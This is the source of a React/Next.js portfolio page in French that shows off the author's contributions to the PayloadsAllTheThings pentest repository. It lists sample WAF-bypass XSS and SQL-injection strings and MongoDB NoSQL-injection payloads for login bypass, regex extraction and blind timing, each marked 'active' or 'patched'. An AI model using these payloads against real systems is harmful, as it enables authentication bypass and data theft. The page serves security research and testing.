'use client';

import Link from "next/link";

export default function PayloadsAllTheThingsPage() {
  return (
    <div className="min-h-screen bg-[#0a0a0a] text-white">

      {/* ── Hero ── */}
      <section className="relative overflow-hidden">
        <div className="absolute inset-0 bg-gradient-to-br from-amber-600/15 via-transparent to-yellow-600/5" />
        <div className="absolute top-0 right-1/3 w-[600px] h-[600px] bg-amber-500/5 rounded-full blur-[120px]" />
        <div className="relative max-w-6xl mx-auto px-6 lg:px-8 pt-28 pb-20">
          <Link href="/projets" className="inline-flex items-center gap-1.5 text-sm text-[#888] hover:text-white transition-colors mb-12">
            <svg width="14" height="14" viewBox="0 0 16 16" fill="none"><path d="M10 4L6 8l4 4" stroke="currentColor" strokeWidth="1.5" strokeLinecap="round" strokeLinejoin="round"/></svg>
            Projets
          </Link>
          <div className="flex items-center gap-3 mb-6">
            <span className="text-[10px] font-bold uppercase tracking-widest text-amber-400 bg-amber-500/10 border border-amber-500/20 rounded-full px-3 py-1">Audit Web</span>
            <span className="text-[10px] font-mono text-[#666]">2025</span>
            <span className="text-[10px] font-mono text-amber-400/60 bg-amber-500/5 px-2 py-0.5 rounded">Open Source Contribution</span>
          </div>
          <h1 className="text-4xl md:text-6xl font-black tracking-tight mb-6">Payloads<span className="text-amber-400">AllTheThings</span></h1>
          <p className="text-lg md:text-xl text-[#999] max-w-2xl leading-relaxed mb-10">
            40+ payloads de bypass WAF Cloudflare/Akamai et une section complète NoSQL injection MongoDB contribués au repo de référence (60k+ stars).
          </p>
          <div className="flex gap-3">
            <Link href="/contact" className="px-6 py-3 bg-amber-600 hover:bg-amber-700 text-white text-sm font-semibold rounded-lg transition-colors">Me contacter</Link>
          </div>
        </div>
      </section>

      {/* ── Payload Showcase ── */}
      <section className="max-w-6xl mx-auto px-6 lg:px-8 pb-20">
        <div className="rounded-2xl border border-[#1a1a1a] bg-[#111] overflow-hidden shadow-2xl shadow-amber-500/5">
          <div className="flex items-center gap-2 px-4 py-3 border-b border-[#1a1a1a] bg-[#0d0d0d]">
            <div className="w-3 h-3 rounded-full bg-[#ff5f57]" />
            <div className="w-3 h-3 rounded-full bg-[#febc2e]" />
            <div className="w-3 h-3 rounded-full bg-[#28c840]" />
            <span className="ml-3 text-[11px] text-[#555] font-mono">PayloadsAllTheThings — contributions</span>
          </div>
          <div className="p-5 space-y-5">
            {/* WAF Bypass Cloudflare */}
            <div className="bg-[#0a0a0a] rounded-lg border border-[#1a1a1a] overflow-hidden">
              <div className="px-4 py-2.5 border-b border-[#1a1a1a] flex justify-between items-center">
                <span className="text-[10px] text-amber-400 font-semibold uppercase tracking-wider">WAF Bypass — Cloudflare</span>
                <span className="text-[10px] text-[#555]">22 payloads</span>
              </div>
              <div className="p-3 space-y-1.5 font-mono text-[11px]">
                {[
                  { payload: "<img src=x onerror=\\u0061lert(1)>", technique: "Unicode normalization", status: "active" },
                  { payload: "%253Cscript%253Ealert(1)%253C/script%253E", technique: "Double URL encoding", status: "active" },
                  { payload: "Transfer-Encoding: chunked\\r\\n1\\r\\n<\\r\\n", technique: "Chunked transfer", status: "patched" },
                  { payload: "param=val&param=<script>alert(1)</script>", technique: "HTTP param pollution", status: "active" },
                ].map((p, i) => (
                  <div key={i} className="flex items-center gap-3 py-1">
                    <span className={`w-1.5 h-1.5 rounded-full shrink-0 ${p.status === 'active' ? 'bg-green-500' : 'bg-red-500'}`} />
                    <span className="text-amber-300 flex-1 truncate">{p.payload}</span>
                    <span className="text-[#555] text-[10px] hidden sm:inline">{p.technique}</span>
                    <span className={`text-[9px] font-bold px-1.5 py-0.5 rounded ${p.status === 'active' ? 'bg-green-500/20 text-green-400' : 'bg-red-500/20 text-red-400'}`}>{p.status}</span>
                  </div>
                ))}
              </div>
            </div>

            {/* WAF Bypass Akamai */}
            <div className="bg-[#0a0a0a] rounded-lg border border-[#1a1a1a] overflow-hidden">
              <div className="px-4 py-2.5 border-b border-[#1a1a1a] flex justify-between items-center">
                <span className="text-[10px] text-amber-400 font-semibold uppercase tracking-wider">WAF Bypass — Akamai</span>
                <span className="text-[10px] text-[#555]">18 payloads</span>
              </div>
              <div className="p-3 space-y-1.5 font-mono text-[11px]">
                {[
                  { payload: "1'/*!50000UNION*//*!50000SELECT*/1,2,3--", technique: "Versioned comments", status: "active" },
                  { payload: "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(alert(1))/", technique: "JS obfuscation", status: "active" },
                  { payload: "X-Original-URL: /admin", technique: "Non-standard headers", status: "patched" },
                ].map((p, i) => (
                  <div key={i} className="flex items-center gap-3 py-1">
                    <span className={`w-1.5 h-1.5 rounded-full shrink-0 ${p.status === 'active' ? 'bg-green-500' : 'bg-red-500'}`} />
                    <span className="text-amber-300 flex-1 truncate">{p.payload}</span>
                    <span className="text-[#555] text-[10px] hidden sm:inline">{p.technique}</span>
                    <span className={`text-[9px] font-bold px-1.5 py-0.5 rounded ${p.status === 'active' ? 'bg-green-500/20 text-green-400' : 'bg-red-500/20 text-red-400'}`}>{p.status}</span>
                  </div>
                ))}
              </div>
            </div>

            {/* NoSQL Injection */}
            <div className="bg-[#0a0a0a] rounded-lg border border-[#1a1a1a] overflow-hidden">
              <div className="px-4 py-2.5 border-b border-[#1a1a1a] flex justify-between items-center">
                <span className="text-[10px] text-amber-400 font-semibold uppercase tracking-wider">NoSQL Injection — MongoDB</span>
                <span className="text-[10px] text-[#555]">Opérateurs + blind</span>
              </div>
              <div className="p-3 space-y-1.5 font-mono text-[11px]">
                {[
                  { payload: '{"username": {"$ne": ""}, "password": {"$ne": ""}}', technique: "$ne operator", status: "active" },
                  { payload: '{"username": {"$regex": "^admin"}}', technique: "$regex extraction", status: "active" },
                  { payload: '{"$where": "sleep(5000)"}', technique: "Blind timing", status: "active" },
                  { payload: '{"username": {"$gt": ""}, "password": {"$gt": ""}}', technique: "$gt bypass", status: "active" },
                ].map((p, i) => (
                  <div key={i} className="flex items-center gap-3 py-1">
                    <span className={`w-1.5 h-1.5 rounded-full shrink-0 ${p.status === 'active' ? 'bg-green-500' : 'bg-red-500'}`} />
                    <span className="text-amber-300 flex-1 truncate">{p.payload}</span>
                    <span className="text-[#555] text-[10px] hidden sm:inline">{p.technique}</span>
                    <span className={`text-[9px] font-bold px-1.5 py-0.5 rounded ${p.status === 'active' ? 'bg-green-500/20 text-green-400' : 'bg-red-500/20 text-red-400'}`}>{p.status}</span>
                  </div>
                ))}
              </div>
            </div>
          </div>
        </div>
      </section>

      {/* ── Impact ── */}
      <section className="border-t border-[#1a1a1a]">
        <div className="max-w-6xl mx-auto px-6 lg:px-8 py-24">
          <div className="text-center mb-16">
            <span className="text-[10px] font-bold uppercase tracking-widest text-amber-400 mb-3 block">Impact</span>
            <h2 className="text-3xl md:text-4xl font-bold tracking-tight">Utilisé par la communauté</h2>
          </div>
          <div className="grid grid-cols-1 md:grid-cols-2 gap-5">
            {[
              { icon: "M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z", title: "WAF Bypass Cloudflare", desc: "Unicode normalization, double URL encoding, chunked transfer, HTTP parameter pollution. 22 payloads testés et datés." },
              { icon: "M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z", title: "WAF Bypass Akamai", desc: "Commentaires SQL versionnés, obfuscation JS, headers non standards, différences de parsing backend/WAF." },
              { icon: "M4 7v10c0 2.21 3.582 4 8 4s8-1.79 8-4V7M4 7c0 2.21 3.582 4 8 4s8-1.79 8-4M4 7c0-2.21 3.582-4 8-4s8 1.79 8 4", title: "NoSQL Injection", desc: "Opérateurs $gt, $ne, $regex, $where. Blind injection via timing. Extraction caractère par caractère. Bypass Mongoose." },
              { icon: "M13 10V3L4 14h7v7l9-11h-7z", title: "Adoption", desc: "Intégré dans sqlmap et NoSQLMap. Référencé dans formations OSCP/OSWE. Milliers d'utilisateurs quotidiens." },
            ].map((f, i) => (
              <div key={i} className="p-6 rounded-xl border border-[#1a1a1a] bg-[#111] hover:border-amber-500/20 transition-colors">
                <div className="w-10 h-10 rounded-lg bg-amber-500/10 flex items-center justify-center mb-4">
                  <svg className="w-5 h-5 text-amber-400" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={1.5} d={f.icon} /></svg>
                </div>
                <h3 className="text-sm font-semibold text-white mb-2">{f.title}</h3>
                <p className="text-[13px] text-[#888] leading-relaxed">{f.desc}</p>
              </div>
            ))}
          </div>
        </div>
      </section>

      {/* ── Stats + CTA ── */}
      <section className="border-t border-[#1a1a1a] bg-[#080808]">
        <div className="max-w-6xl mx-auto px-6 lg:px-8 py-20">
          <div className="grid grid-cols-2 md:grid-cols-4 gap-6 mb-20">
            {[
              { value: "40+", label: "Payloads contribués", color: "text-amber-400" },
              { value: "60k+", label: "Stars du repo", color: "text-yellow-400" },
              { value: "2", label: "Sections majeures", color: "text-green-400" },
              { value: "3", label: "Outils intégrés", color: "text-cyan-400" },
            ].map((s, i) => (
              <div key={i} className="text-center p-6 rounded-xl border border-[#1a1a1a]">
                <div className={`text-3xl font-bold font-mono ${s.color}`}>{s.value}</div>
                <div className="text-[11px] text-[#666] mt-1">{s.label}</div>
              </div>
            ))}
          </div>
          <div className="flex flex-col md:flex-row justify-between items-start md:items-center gap-8 mb-20">
            <div>
              <span className="text-[10px] font-bold uppercase tracking-widest text-amber-400 mb-3 block">Domaines</span>
              <h2 className="text-2xl font-bold tracking-tight">Expertise</h2>
            </div>
            <div className="flex flex-wrap gap-2">
              {["Security Research", "WAF Bypass", "NoSQL", "MongoDB", "Cloudflare", "Akamai"].map(t => (
                <span key={t} className="px-4 py-2 text-xs font-semibold text-[#ccc] bg-[#111] border border-[#222] rounded-lg">{t}</span>
              ))}
            </div>
          </div>
          <div className="text-center">
            <h2 className="text-2xl md:text-3xl font-bold tracking-tight mb-4">Contributions open source</h2>
            <p className="text-sm text-[#888] mb-8 max-w-md mx-auto">Des payloads testés, datés et utilisés par la communauté pentest mondiale.</p>
            <div className="flex justify-center gap-3">
              <Link href="/contact" className="px-6 py-3 bg-amber-600 hover:bg-amber-700 text-white text-sm font-semibold rounded-lg transition-colors">Me contacter</Link>
            </div>
          </div>
        </div>
      </section>
    </div>
  );
}
